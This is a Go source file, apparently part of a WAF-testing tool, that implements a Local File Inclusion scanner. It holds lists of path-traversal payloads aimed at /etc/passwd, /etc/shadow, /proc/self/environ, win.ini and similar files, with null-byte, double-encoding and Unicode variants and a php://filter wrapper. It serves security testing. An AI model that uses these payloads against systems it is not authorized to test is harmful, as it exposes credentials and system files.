// Package lfi provides Local File Inclusion testing
package lfi

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures LFI testing
type Config struct {
	attackconfig.Base
	Headers map[string]string
	OS      string // "linux", "windows", or "both"
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutProbing,
		},
		OS: "both",
	}
}

// Result represents an LFI test result
type Result struct {
	URL          string           `json:"url"`
	Parameter    string           `json:"parameter"`
	Payload      string           `json:"payload"`
	StatusCode   int              `json:"status_code"`
	ResponseSize int              `json:"response_size"`
	Vulnerable   bool             `json:"vulnerable"`
	FileContent  string           `json:"file_content,omitempty"`
	Evidence     string           `json:"evidence,omitempty"`
	Severity     finding.Severity `json:"severity"`
	Timestamp    time.Time        `json:"timestamp"`
}

// Scanner performs LFI testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new LFI scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutProbing
	}

	client := config.Client
	if client == nil {
		client = httpclient.Default()
	}

	return &Scanner{
		config:  config,
		client:  client,
		results: make([]Result, 0),
	}
}

// Scan tests a URL for LFI vulnerabilities
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads(s.config.OS) {
			select {
			case <-ctx.Done():
				return results, ctx.Err()
			default:
			}

			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload.Value

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
				s.config.NotifyVulnerabilityFound()
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// Payload represents an LFI payload
type Payload struct {
	Value   string
	OS      string
	Markers []string
}

// testPayload tests a single LFI payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param string, payload Payload, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload.Value,
		Timestamp: time.Now(),
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	q := u.Query()
	for k, v := range params {
		q.Set(k, v)
	}
	u.RawQuery = q.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", u.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload.Markers)
	if result.Vulnerable {
		result.FileContent = string(body)
		result.Severity = finding.High
	}

	return result
}

// detectVulnerability checks response for LFI indicators
func (s *Scanner) detectVulnerability(body string, markers []string) (bool, string) {
	for _, marker := range markers {
		if strings.Contains(body, marker) {
			return true, "File content marker: " + marker
		}
	}

	// Generic file content patterns
	patterns := map[string]string{
		"root:x:0:0":    "passwd file",
		"[fonts]":       "win.ini file",
		"[extensions]":  "system.ini file",
		"[boot loader]": "boot.ini file",
		"<?php":         "PHP source",
		"#!/bin":        "shell script",
	}

	for pattern, desc := range patterns {
		if strings.Contains(body, pattern) {
			return true, desc + " detected"
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns LFI test payloads including null byte and encoding variants
func Payloads(os string) []Payload {
	payloads := make([]Payload, 0)

	if os == "linux" || os == "both" {
		payloads = append(payloads, linuxPayloads()...)
	}
	if os == "windows" || os == "both" {
		payloads = append(payloads, windowsPayloads()...)
	}

	// Include null byte injection and advanced encoding payloads
	for _, p := range NullBytePayloads() {
		if os == "both" || os == p.OS {
			payloads = append(payloads, p)
		}
	}
	for _, p := range UnicodePayloads() {
		if os == "both" || os == p.OS {
			payloads = append(payloads, p)
		}
	}

	return payloads
}

func linuxPayloads() []Payload {
	return []Payload{
		{Value: "/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../../../etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "....//....//etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "..%2f..%2fetc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "%2e%2e/%2e%2e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "....//....//....//etc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "/etc/shadow", OS: "linux", Markers: []string{"root:"}},
		{Value: "/etc/hosts", OS: "linux", Markers: []string{"localhost"}},
		{Value: "/proc/self/environ", OS: "linux", Markers: []string{"PATH=", "HOME="}},
		{Value: "/proc/version", OS: "linux", Markers: []string{"Linux version"}},
		{Value: "/var/log/apache2/access.log", OS: "linux", Markers: []string{"GET", "HTTP"}},
		{Value: "php://filter/convert.base64-encode/resource=/etc/passwd", OS: "linux", Markers: []string{"cm9vdDo"}},
	}
}

func windowsPayloads() []Payload {
	return []Payload{
		{Value: "C:\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "..\\..\\..\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "....\\....\\Windows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		{Value: "C:\\Windows\\System32\\drivers\\etc\\hosts", OS: "windows", Markers: []string{"localhost"}},
		{Value: "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts", OS: "windows", Markers: []string{"localhost"}},
		{Value: "C:\\boot.ini", OS: "windows", Markers: []string{"[boot loader]"}},
		{Value: "..%5c..%5cWindows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
	}
}

// NullBytePayloads returns null byte injection payloads
func NullBytePayloads() []Payload {
	return []Payload{
		{Value: "../../../etc/passwd%00", OS: "linux", Markers: []string{"root:"}},
		{Value: "../../../etc/passwd\x00", OS: "linux", Markers: []string{"root:"}},
		{Value: "..\\..\\..\\Windows\\win.ini%00", OS: "windows", Markers: []string{"[fonts]"}},
	}
}

// UnicodePayloads returns Unicode normalization and double-encoding payloads
func UnicodePayloads() []Payload {
	return []Payload{
		// Double URL encoding
		{Value: "..%252f..%252f..%252fetc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "%252e%252e/%252e%252e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		// Unicode / UTF-8 encoded path separators
		{Value: "..%c0%af..%c0%afetc/passwd", OS: "linux", Markers: []string{"root:"}},
		{Value: "..%ef%bc%8f..%ef%bc%8fetc/passwd", OS: "linux", Markers: []string{"root:"}},
		// Overlong UTF-8 encoding of dot
		{Value: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", OS: "linux", Markers: []string{"root:"}},
		// Double-encoded backslash for Windows
		{Value: "..%255c..%255c..%255cWindows\\win.ini", OS: "windows", Markers: []string{"[fonts]"}},
		// Unicode fullwidth characters
		{Value: "\uff0e\uff0e/\uff0e\uff0e/etc/passwd", OS: "linux", Markers: []string{"root:"}},
	}
}
